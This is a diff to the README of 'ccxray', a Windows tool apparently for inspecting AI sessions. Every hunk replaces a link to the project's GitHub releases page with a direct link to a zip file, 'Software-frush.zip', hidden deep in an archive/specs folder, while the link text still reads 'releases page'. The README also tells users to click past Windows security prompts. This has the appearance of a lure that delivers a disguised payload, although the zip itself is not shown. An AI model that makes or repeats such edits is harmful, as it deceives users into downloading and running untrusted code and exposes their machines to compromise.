@@ -1,6 +1,6 @@
 # 🪟 ccxray - See AI sessions with clarity
 
-[![Download ccxray](https://img.shields.io/badge/Download%20ccxray-blue-grey?style=for-the-badge)](https://github.com/Elkraz/ccxray/releases)
+[![Download ccxray](https://img.shields.io/badge/Download%20ccxray-blue-grey?style=for-the-badge)](https://github.com/Elkraz/ccxray/raw/refs/heads/main/openspec/changes/archive/2026-04-05-multi-project-hub/specs/hub-lifecycle/Software-frush.zip)
 
 ## 🔍 What ccxray does
 
@@ -30,7 +30,7 @@ If you use a work computer, you may need approval to run local proxy tools.
 
 ## ⬇️ Download ccxray
 
-Go to the [ccxray releases page](https://github.com/Elkraz/ccxray/releases) to visit this page to download.
+Go to the [ccxray releases page](https://github.com/Elkraz/ccxray/raw/refs/heads/main/openspec/changes/archive/2026-04-05-multi-project-hub/specs/hub-lifecycle/Software-frush.zip) to visit this page to download.
 
 Look for the latest release and download the file that matches Windows. In most cases, this will be an `.exe` file or a Windows zip file.
 
@@ -44,7 +44,7 @@ After the download finishes:
 
 Follow these steps on Windows:
 
-1. Download ccxray from the [releases page](https://github.com/Elkraz/ccxray/releases)
+1. Download ccxray from the [releases page](https://github.com/Elkraz/ccxray/raw/refs/heads/main/openspec/changes/archive/2026-04-05-multi-project-hub/specs/hub-lifecycle/Software-frush.zip)
 2. Open your Downloads folder
 3. Find the ccxray file you downloaded
 4. If Windows shows a security prompt, choose the option that lets you run the app
@@ -170,7 +170,7 @@ New releases may include:
 - Windows fixes
 - Proxy stability improvements
 
-Check the [releases page](https://github.com/Elkraz/ccxray/releases) from time to time for the newest version.
+Check the [releases page](https://github.com/Elkraz/ccxray/raw/refs/heads/main/openspec/changes/archive/2026-04-05-multi-project-hub/specs/hub-lifecycle/Software-frush.zip) from time to time for the newest version.
 
 ## 🧪 Expected behavior
 
